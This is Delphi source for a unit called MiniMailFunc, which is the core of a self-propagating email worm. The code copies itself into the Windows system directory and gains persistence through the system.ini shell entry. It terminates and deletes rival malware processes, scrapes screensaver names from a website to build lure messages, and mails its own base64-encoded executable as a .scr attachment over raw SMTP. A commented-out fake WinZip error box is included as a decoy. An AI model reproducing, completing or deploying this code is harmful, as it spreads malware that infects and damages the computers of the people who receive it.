   unit MiniMailFunc;

   interface

   Uses
     Windows,
     Winsock,
     Messages,
     Tlhelp32;

   Var
     MutexHandle: THandle;
     VirusHandle: String;
     VirusHandleEnc: String;
     ScrLink: String;
     mailSock:TSocket;

   procedure StartUp;
   Procedure MakeBase64;
   PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER; OVERLOAD;
   PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;

   Function SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SMTP: String; Port: Integer):Bool;
   function ExtractFilePath(const Path: string): string;
   function ExtractFileName(const Path: string): string;
   function GetFileSize(FileName: String): Int64;
   function ExtractFileExt(const Filename: string): string;
   function LowerCase(const S: string): string;
   function IPstr(HostName:String) : String;
   function InttoStr(const Value: integer): string;
   Function EncryptStr(Str: String): String;

   implementation

   Function getHttpReq(Add,Str:String):String;
   Begin
       Result :=
       'GET /'+Add+' HTTP/1.1'#13#10'Host: '+str+#13#10'User-Agent: '+
       'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.6) '+
       'Gecko/20040206 Firefox/0.8'#13#10'Accept: application/x-shockwave-flash,'+
       'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,'+
       'text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2'+
       ',*/*;q=0.1'#13#10'Accept-Language: en-us,en;q=0.5..Accept-Encoding: '+
       'gzip,deflate'#13#10'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7'#13#10''+
       'Keep-Alive: 300'#13#10'Connection: keep-alive'#13#10#13#10
   End;

   Function GetSource(http, subhttp:String) :String;
   Var
     Sock          : TSocket;
     InAddr        : in_addr;
     SockAddr      : TSockAddrIn;
     Str           : String;
     Tmp1, Tmp2    : String;
     Buf           : Array[0..36000] of Char;
     WSA           : TWSAData;
     F             : TextFile;
     Time          : TTimeVal;
     FD_Struct     : TFDSet;
   Begin

     Str := IPStr(Http);

     WSAStartUp(257, WSA);

     Sock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     SockAddr.Sin_Family := AF_INET;
     SockAddr.Sin_Port := HTons(80);
     SockAddr.Sin_Addr.S_Addr := Inet_Addr(pChar(Str));

     If Connect(Sock, SockAddr, SizeOf(SockAddr)) = ERROR_SUCCESS Then
     Begin

       Str := GetHTTPReq(SubHttp, Http);

       Send(Sock, Str[1], Length(Str), 0);
       Recv(Sock, Buf, SizeOf(Buf), 0);
       Str := String(Buf);

       If Pos('Location', Str)>0 Then
       Begin
         Tmp2 := '';
         Tmp1 := '';

         Tmp1 := Copy(Str, Pos('Location', Str)+10, Length(Str));
         Tmp1 := Copy(Tmp1, 1, Pos(#13#10, Tmp1)-1);
         If Copy(Tmp1, 1, 4) = 'http' Then
         Begin
           Tmp1 := Copy(Tmp1, 8, Length(Tmp1));
         End;

         If Pos('/', Tmp1)> 0 Then
         Begin
           Tmp2 := Copy(Tmp1, Pos('/', Tmp1)+1, Length(Tmp1));
           Tmp1 := Copy(Tmp1, 1, Pos('/', Tmp1)-1);
         End;

         Str := GetHTTPReq(Tmp2, Tmp1);

         Send(Sock, Str[1], Length(Str), 0);

       End Else
         Str := '';

       Repeat
         ZeroMemory(@Buf, SizeOf(Buf));
         Tmp2 := '';
         Time.tv_sec := 5;
         Time.tv_usec := 0;
         FD_ZERO(FD_STRUCT);
         FD_SET(Sock, FD_STRUCT);
         If Select(0, @FD_STRUCT, NIL, NIL, @Time) <= 0 Then
         Begin
           Break;
         End;

         Recv(Sock, Buf, SizeOf(Buf), 0);

         Str := Str + String(Buf);
         Tmp2 := Buf;
       Until Tmp2 = '';

       Result := Str;
     End;
     WSACleanUp();
   End;

   Function GetScreenSaver: String;
   Var
     Url1  :String;
     Url2  :String;
     UrlId :Integer;
     Text  :String;
   Begin
     Randomize;
     Url1 := 'www.screensaver.com';
     Url2 := 'download.cfm?id=';
     Text := '';
     Repeat
       UrlId := Random(9000)+1;
       Text := GetSource(Url1, Url2+IntToStr(UrlId));
       ScrLink := 'http://'+url1+'/'+url2+inttostr(urlid);
       If Pos('Invalid URL', Text) > 0 Then Text := 'error';
       If Text <> 'error' Then
       Begin
         Text := Copy(Text, Pos('/emaillink.cfm?id=', Text), Length(Text));
         Text := Copy(Text, Pos('name=', Text)+5, Length(Text));
         Text := Copy(Text, 1, Pos('"', Text)-1);
       End;
     Until Text <> 'error';
     Result := Text;
   End;

   Function EncryptStr(Str: String): String;
   Var
     I: Integer;
     C: Integer;
   Begin
     Result := '';
     For I := 1 To Length(Str) Do
     Begin
       C := Ord(Str[i]);
       C := (C Xor 1) Xor 6;
       Result := Result + Chr(C);
     End;
   End;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function InttoStr(const Value: integer): string;
   var
     S: string[11];
   begin
     Str(Value, S);
     Result := S;
   end;

   Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
   Var
     xPos: Integer;
   Begin
     While Pos(ReplaceWord, Text)>0 Do
     Begin
       xPos := Pos(ReplaceWord, Text);
       Delete(Text, xPos, length(ReplaceWord));
       Insert(WithWord, Text, xPos);
     End;
   End;

   FUNCTION MyRecv(Code:STRING) : Boolean;
   VAR
     Buf : ARRAY [0..2048] OF Char;
   BEGIN
     ZeroMemory(@Buf[0],SizeOf(Buf));
     IF(Recv(mailSock,Buf,SizeOf(Buf),0)=SOCKET_ERROR)OR(Copy(Buf,1,3)<>Code) THEN Result:=False ELSE Result:=True;
   END;

   FUNCTION MySend(STR:STRING) : Boolean;
   BEGIN
     IF Send(mailSock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;

   Function SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SMTP: String; Port: Integer):Bool;
   Var
     F     :FILE;
     Buf   :AnsiString;
     P     :AnsiString;
     FileBuf:AnsiString;

     WSA   :TWSAData;
     addr  :TSockAddrIn;

     Scr, Scr2: String;
     A,B,J :String;
     Rev: Array[0..1600] of Char;
     LocalHost  : ARRAY [0..63] OF CHAR;

     Procedure SendData(Text: String; Var Sock: TSocket);
     Begin
       Send(Sock, Text[1], Length(Text), 0);
     End;

   Begin
     WSAStartUp(MakeWord(2,1), WSA);
     GetHostName(LocalHost,SizeOf(LocalHost));

     Scr := GetScreenSaver;
     Scr2 := Scr;
     Scr := Scr + '.scr';
     ReplaceStr('%20', ' ', Scr2);
     ReplaceStr('screenshot_id', Scr2, Body);
     ReplaceStr('screenshot_id', Scr2, Subject);
     ReplaceStr('screenshot_url', ScrLink, Body);

     MailSock := Socket(AF_INET, SOCK_STREAM, 0);
     Addr.sin_family := AF_INET;
     Addr.sin_port := hTons(Port);
     Addr.sin_addr.S_addr := inet_addr(pchar(ipstr(SMTP)));

     Result := False;
     If Connect(MailSock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
     Begin
         IF NOT MyRecv('220') THEN Exit;
         MySend('HELO '+LocalHost+#13#10);
         IF NOT MyRecv('250') THEN Exit;
         MySend('MAIL FROM: <'+From+'>'#13#10);
         IF NOT MyRecv('250') THEN Exit;
         MySend('RCPT TO: <'+Recipt+'>'#13#10);
         IF NOT MyRecv('250') THEN Exit;
         MySend('DATA'#13#10);
         IF NOT MyRecv('354') THEN Exit;
         MySend('From: '+From+#13#10+
                'To: '+Recipt+#13#10+
                'Subject: '+Subject+#13#10+
                'MIME-Version: 1.0'#13#10+
                'Content-Type: multipart/mixed; boundray="'+boundray+'"'#13#10#13#10+
                '--'+boundray+#13#10+
                'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                Body+#13#10#13#10+
                '--'+boundray+#13#10+
                'Content-Type: application/x-shockwave-flash;'#13#10+
                '    name="'+Scr+'"'#13#10+
                'Content-Transfer-Encoding: base64'#13#10#13#10);
         AssignFile(F, VirusHandleEnc);
         FileMode:=0;
         {$I-}
         Reset(F,1);
         IF IOResult=0 THEN BEGIN
           SetLength(FileBuf,FileSize(F));
           BlockRead(F,FileBuf[1],FileSize(F));
           Base64Encode(FileBuf,P);
           MySend(P);
           CloseFile(F);
         END;
         {$I+}
         MySend(#13#10'--'+boundray+'--'#13#10'.'#13#10);
         IF NOT MyRecv('250') THEN Exit;
         MySend('QUIT'#13#10);
         Result:=True;
         WSACleanup();
         Exit;
     End;
   End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function GetFileSize(FileName: String): Int64;
   Var
     H: THandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
     End;
   End;

   PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
   CONST
     cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
   VAR
     ByThrees : Cardinal;
     LeftOver : Cardinal;
     Line     : Word;
   ASM
     mov ESI,[EAX]
     mov EDI,[ECX]
     mov EAX,EBX
     mov ECX,$03
     xor EDX,EDX
     div ECX
     mov ByThrees,EAX
     mov LeftOver,EDX
     lea ECX,cBase64Codec[0]
     xor EAX,EAX
     xor EBX,EBX
     xor EDX,EDX
     cmp ByThrees,0
     jz  @@LeftOver
     mov Line,0
     @@LoopStart:
     inc Line
     LODSW
     mov BL,AL
     shr BL,2
     mov DL,BYTE PTR [ECX+EBX]
     mov BH,AH
     and BH,$0F
     rol AX,4
     and AX,$3F
     mov DH,BYTE PTR [ECX+EAX]
     mov AX,DX
     STOSW
     LODSB
     mov BL,AL
     shr BX,6
     mov DL,BYTE PTR [ECX+EBX]
     and AL,$3F
     xor AH,AH
     mov DH,BYTE PTR [ECX+EAX]
     mov AX,DX
     STOSW
     cmp Line,19
     jnz @@ugor
     mov AX,$0A0D
     STOSW
     mov Line,0
     @@ugor:
     dec ByThrees
     jnz @@LoopStart
     @@LeftOver:
     cmp LeftOver, 0
     jz  @@Done
     xor EAX,EAX
     xor EBX,EBX
     xor EDX,EDX
     LODSB
     shl AX,6
     mov BL,AH
     mov DL,BYTE PTR [ECX+EBX]
     dec LeftOver
     jz  @@SaveOne
     shl AX,2
     and AH,$03
     LODSB
     shl AX,4
     mov BL,AH
     mov DH,BYTE PTR [ECX+EBX]
     shl EDX,16
     shr AL,2
     mov BL,AL
     mov DL,BYTE PTR [ECX+EBX]
     mov DH,'='
     jmp @@WriteLast4
     @@SaveOne:
     shr AL,2
     mov BL,AL
     mov DH,BYTE PTR [ECX+EBX]
     shl EDX,16
     mov DH,'='
     mov DL,'='
     @@WriteLast4:
     mov EAX,EDX
     ror EAX,16
     STOSD
     @@Done:
   END;

   PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;
   VAR
     PIn     : Pointer;
     POut    : Pointer;
     InSize  : Cardinal;
     OutSize : Cardinal;
   BEGIN
     InSize:=Length(InText);
     OutSize:=(InSize DIV 3) SHL 2;
     IF InSize MOD 3>0 THEN Inc(OutSize,4);
     Outsize:=Outsize+Outsize DIV 20;
     SetLength(OutText,OutSize);
     PIn:=@InText[1];
     POut:=@OutText[1];
     Base64Encode(PIn,InSize,POut);
   END;

   Procedure MakeBase64;
   Var
     inFile        :File;
     outFile       :File;
     inBuf         :AnsiString;
     outBuf        :AnsiString;
     readBytes     :Integer;
   Begin
     AssignFile(inFile, VirusHandle);
     Reset(inFile, 1);
     SetLength(inBuf, FileSize(inFile));
     BlockRead(inFile, inBuf[1], FileSize(inFile), readBytes);
     CloseFile(inFile);

     Base64Encode(inBuf, outBuf);

     AssignFile(outFile, VirusHandleEnc);
     Rewrite(outFile, 1);
     BlockWrite(outFile, outBuf[1], Length(outBuf));
     CloseFile(outFile);
   End;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function ExtractFilePath(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, 1, i);
         Break;
       end;
     end;
   end;

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function KillTask(ExeFileName: string): integer;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     result := 0;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
            UpperCase(ExeFileName))
        or (UpperCase(FProcessEntry32.szExeFile) =
            UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(OpenProcess(
                           PROCESS_TERMINATE, BOOL(0),
                           FProcessEntry32.th32ProcessID), 0));
       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   procedure remove_spybot;

     Procedure DeleteIt(Name: String);
     Var
       sysdir: array[0..256] of char;
       windir: array[0..256] of char;
     Begin
       getsystemdirectory(sysdir, 256);
       getwindowsdirectory(windir, 256);
       if fileexists(string(sysdir)+'\'+name) then deletefile(pchar(string(sysdir)+'\'+name));
       if fileexists(string(windir)+'\'+name) then deletefile(pchar(string(windir)+'\'+name));
     End;

   begin
     KillTask('wuaumqr.exe');
     KillTask('wupdate.exe');
     KillTask('5py.exe');
     KillTask('taskmger.exe');
     KillTask('msupdate32.exe');
     KillTask('mswin32.exe');
     KillTask('miniMail-test.exe');
     DeleteIt('wuaumqr.exe');
     DeleteIt('wupdate.exe');
     DeleteIt('5py.exe');
     DeleteIt('taskmger.exe');
     DeleteIt('msupdate32.exe');
     DeleteIt('mswin32.exe');
     DeleteIt('miniMail-test.exe');
   end;

   procedure StartUp;
   var
     Mutex: String;
     fName: String;
     bCopy: Bool;

     Handle: THandle;
     sysDir: Array[0..255] Of Char;
   begin
     remove_spybot;
     Mutex := 'miniMail-version1.0';
     Handle := CreateMutex(NIL, FALSE, pChar(Mutex));
     If Handle = ERROR_ALREADY_EXISTS Then
       ExitProcess(0);
     MutexHandle := Handle;

     GetSystemDirectory(sysDir, 256);
     fName := String(sysDir)+'\miniMail.exe';
     bCopy := CopyFile(pChar(ParamStr(0)), pChar(fName), False);
     If (Not bCopy) Then
       ExitProcess(0);
     WritePrivateProfileString('boot', 'shell', 'Explorer.exe miniMail.exe', 'system.ini');

     VirusHandle := fName;
     VirusHandleEnc := fName + '-encoded';

     fname := ExtractFilePath(paramstr(0));
     Delete(fName, Length(fName), 1);

     While Length(fName) > 30 do
     Begin
       fname := ExtractFilePath(fName);
       Delete(fName, Length(fName), 1);
     End;
     {
     Insert('\...\'+ExtractFileName(ParamStr(0)), fName, Length(fName)+1);
     MessageBox(0, pchar(fName+': Unexpected end of archive.'), 'WinZip Self-Extractor', mb_ok or MB_ICONERROR);
     }
   end;

   end.

